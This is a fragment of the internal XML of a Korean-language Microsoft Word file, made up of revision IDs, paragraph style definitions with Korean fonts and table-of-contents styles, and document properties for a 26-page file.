    <w:rsid w:val="00284488"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="002B1872"/>
    <w:rsid w:val="002B4171"/>
    <w:rsid w:val="002D3108"/>
    <w:rsid w:val="00323BAB"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003A370B"/>
    <w:rsid w:val="005130AB"/>
    <w:rsid w:val="00562D9D"/>
    <w:rsid w:val="005D7EC4"/>
    <w:rsid w:val="005E18AC"/>
    <w:rsid w:val="005F7418"/>
    <w:rsid w:val="006506E7"/>
    <w:rsid w:val="006B3373"/>
    <w:rsid w:val="006E1AB2"/>
    <w:rsid w:val="00740834"/>
    <w:rsid w:val="00836AE5"/>
    <w:rsid w:val="0084736D"/>
    <w:rsid w:val="00913677"/>
    <w:rsid w:val="009479D6"/>
    <w:rsid w:val="00980484"/>
    <w:rsid w:val="009B5E15"/>
    <w:rsid w:val="00A22A78"/>
    <w:rsid w:val="00A37F8A"/>
    <w:rsid w:val="00A747DE"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B044C0"/>
    <w:rsid w:val="00B1529A"/>
    <w:rsid w:val="00B30C6E"/>
    <w:rsid w:val="00B31433"/>
    <w:rsid w:val="00B45AFB"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00B54680"/>
    <w:rsid w:val="00BD5D9D"/>
    <w:rsid w:val="00C67DD2"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CB0DA2"/>
    <w:rsid w:val="00CF7CB4"/>
    <w:rsid w:val="00D369CD"/>
    <w:rsid w:val="00D40876"/>
    <w:rsid w:val="00D928A8"/>
    <w:rsid w:val="00DD0E36"/>
    <w:rsid w:val="00E02863"/>
    <w:rsid w:val="00E4760E"/>
    <w:rsid w:val="00F24D80"/>
    <w:rsid w:val="00F6222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15789F75"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{2ED7391E-D605-4B22-89B2-D64F5F6537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aff1">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="a1"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00CF7CB4"/>
    <w:pPr>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="굴림" w:eastAsia="바탕체" w:hAnsi="바탕" w:cs="Times New Roman"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:eastAsia="ko-KR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="aff2">
    <w:name w:val="목차제목"/>
    <w:basedOn w:val="a1"/>
    <w:rsid w:val="00CF7CB4"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:wordWrap w:val="0"/>
      <w:autoSpaceDE w:val="0"/>
      <w:autoSpaceDN w:val="0"/>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="굴림" w:eastAsia="바탕체" w:hAnsi="굴림" w:cs="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="2"/>
      <w:sz w:val="40"/>
      <w:szCs w:val="20"/>
      <w:lang w:eastAsia="ko-KR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="20pt">
    <w:name w:val="스타일 (기호) 굴림 20 pt 굵게 가운데"/>
    <w:basedOn w:val="a1"/>
    <w:rsid w:val="00CF7CB4"/>
    <w:pPr>
      <w:widowControl w:val="0"/>
      <w:wordWrap w:val="0"/>
      <w:autoSpaceDE w:val="0"/>
      <w:autoSpaceDN w:val="0"/>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="굴림" w:eastAsia="바탕체" w:hAnsi="굴림" w:cs="바탕"/>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="2"/>
      <w:sz w:val="40"/>
      <w:szCs w:val="20"/>
      <w:lang w:eastAsia="ko-KR"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="--">
    <w:name w:val="목차-표-그림"/>
    <w:basedOn w:val="a1"/>
    <w:rsid w:val="00CF7CB4"/>
    <w:pPr>
      <w:adjustRightInd w:val="0"/>
      <w:spacing w:after="0" w:line="280" w:lineRule="atLeast"/>
      <w:jc w:val="center"/>
      <w:textAlignment w:val="baseline"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="바탕체" w:eastAsia="바탕체" w:hAnsi="Times New Roman" w:cs="바탕"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="28"/>
      <w:szCs w:val="20"/>
      <w:u w:val="single"/>
      <w:lang w:eastAsia="ko-K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C4982866-DF37-48A1-87BA-F9A6984A958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199</TotalTime>
  <Pages>26</Pages>
  <Words>4668</Words>
  <Characters>26611</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>221</Lines>
  <Paragraphs>62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31217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user</cp:lastModifiedBy>
  <cp:revision>45</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-07-10T06:54:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>